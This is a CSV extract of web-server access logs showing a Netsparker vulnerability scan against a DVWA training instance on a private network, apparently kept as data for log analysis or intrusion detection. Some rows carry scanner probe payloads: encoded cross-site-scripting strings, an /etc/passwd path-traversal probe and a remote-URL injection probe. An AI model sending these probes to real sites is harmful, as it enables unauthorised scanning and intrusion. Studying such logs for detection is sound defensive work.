,ip_address,remote_log_name,authenticated_user_name,timestamp,method,requesta_url,protocol,status_code,bytes_transferred,referrer_url,user_agent
4660,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4661,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4662,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4663,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4664,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4665,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1009,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4666,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1009,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4667,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1009,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4668,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1009,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4669,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1009,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4670,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1009,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4671,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/login.php,HTTP/1.1,200,950,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4672,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/login.php,HTTP/1.1,200,986,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4673,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/login.php,HTTP/1.1,200,986,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4674,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/login.php,HTTP/1.1,200,986,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4675,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/login.php,HTTP/1.1,200,986,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4676,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/login.php,HTTP/1.1,200,986,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4677,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/login.php,HTTP/1.1,200,986,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4678,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/?C='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000334)%3C/scRipt%3E,HTTP/1.1,200,868,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4679,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/?C='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000335)%3C/scRipt%3E,HTTP/1.1,200,868,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4680,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/?C=%26%2339%3b%2bnetsparker(0x000332)%2b%26%2339%3b,HTTP/1.1,200,868,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4681,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/?C=%26%2339%3b%2bnetsparker(0x000333)%2b%26%2339%3b,HTTP/1.1,200,868,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4682,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/?C=%2f%2fr87.com%2f%3f0x00033C,HTTP/1.1,200,868,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4683,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/?C=%2fetc%2fpasswd,HTTP/1.1,200,868,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4684,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/?C=data%3a%3bbase64%2cTlM3NzU0NTYxNDQ2NTc1,HTTP/1.1,200,868,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4685,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/view_help.php'%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000336)%3C/scRipt%3E,HTTP/1.1,404,616,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4686,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/view_help.php'%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000337)%3C/scRipt%3E,HTTP/1.1,404,616,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4687,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/view_help.php/%20ns=netsparker(0x00032C),HTTP/1.1,200,762,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4688,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/view_help.php/%20ns=netsparker(0x00032D),HTTP/1.1,200,762,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4689,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/view_help.php/%22ns=%22netsparker(0x000329),HTTP/1.1,200,762,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4690,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/view_help.php/%2522ns%253D%2522netsparker%25280x00032E%2529,HTTP/1.1,200,762,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4691,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/view_help.php/%2522ns%253D%2522netsparker%25280x00032F%2529,HTTP/1.1,200,762,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4692,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/view_help.php/'ns='netsparker(0x00032A),HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4693,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/view_help.php/'ns='netsparker(0x00032B),HTTP/1.1,200,762,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4694,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,"/DVWA/vulnerabilities/view_help.php?'\""@--></style></scRipt><scRipt>netsparker(0x000340)</scRipt>",HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4695,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,"/DVWA/vulnerabilities/view_help.php?'\""@--></style></scRipt><scRipt>netsparker(0x000341)</scRipt>",HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4696,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,"/DVWA/vulnerabilities/view_help.php?'\""--></style></scRipt><scRipt>netsparker(0x000338)</scRipt>",HTTP/1.1,200,762,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4697,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,"/DVWA/vulnerabilities/view_help.php?'\""--></style></scRipt><scRipt>netsparker(0x000339)</scRipt>",HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4698,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/view_source.php,HTTP/1.1,200,962,(),"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4699,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/view_source.php,HTTP/1.1,200,962,"'\""@--></style></scRipt><scRipt>netsparker(0x000344)</scRipt>","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4700,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/view_source.php,HTTP/1.1,200,962,"'\""@--></style></scRipt><scRipt>netsparker(0x000345)</scRipt>","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4701,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/view_source.php,HTTP/1.1,200,962,"'\""--></style></scRipt><scRipt>netsparker(0x000342)</scRipt>","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4702,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/view_source.php,HTTP/1.1,200,962,"'\""--></style></scRipt><scRipt>netsparker(0x000343)</scRipt>","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4703,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/view_source.php,HTTP/1.1,200,962,hTTp://r87.com/n,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4704,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/view_source.php?hTTp://r87.com/n,HTTP/1.1,200,926,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4705,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/view_source.php?nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x00033A)%3C/scRipt%3E,HTTP/1.1,200,962,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4706,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/view_source.php?nsextt='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x00033B)%3C/scRipt%3E,HTTP/1.1,200,962,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4707,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/view_source.php?nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x00033E)%3C/scRipt%3E,HTTP/1.1,200,961,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4708,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/vulnerabilities/view_source.php?nsextt='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x00033F)%3C/scRipt%3E,HTTP/1.1,200,962,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4709,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,383,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4710,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,383,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4711,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4712,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4713,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4714,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4715,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4716,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4717,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4718,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4719,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4720,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4721,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4722,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4723,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4724,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4725,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4726,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4727,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4728,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4729,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4730,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4731,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4732,192.168.4.164,,,[22/Dec/2016:15:20:46 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4733,192.168.4.164,,,[22/Dec/2016:15:20:46 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4734,192.168.4.164,,,[22/Dec/2016:15:20:46 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4735,192.168.4.164,,,[22/Dec/2016:15:20:46 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4736,192.168.4.164,,,[22/Dec/2016:15:20:46 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4737,192.168.4.164,,,[22/Dec/2016:15:20:46 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1009,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4738,192.168.4.164,,,[22/Dec/2016:15:20:46 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1009,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
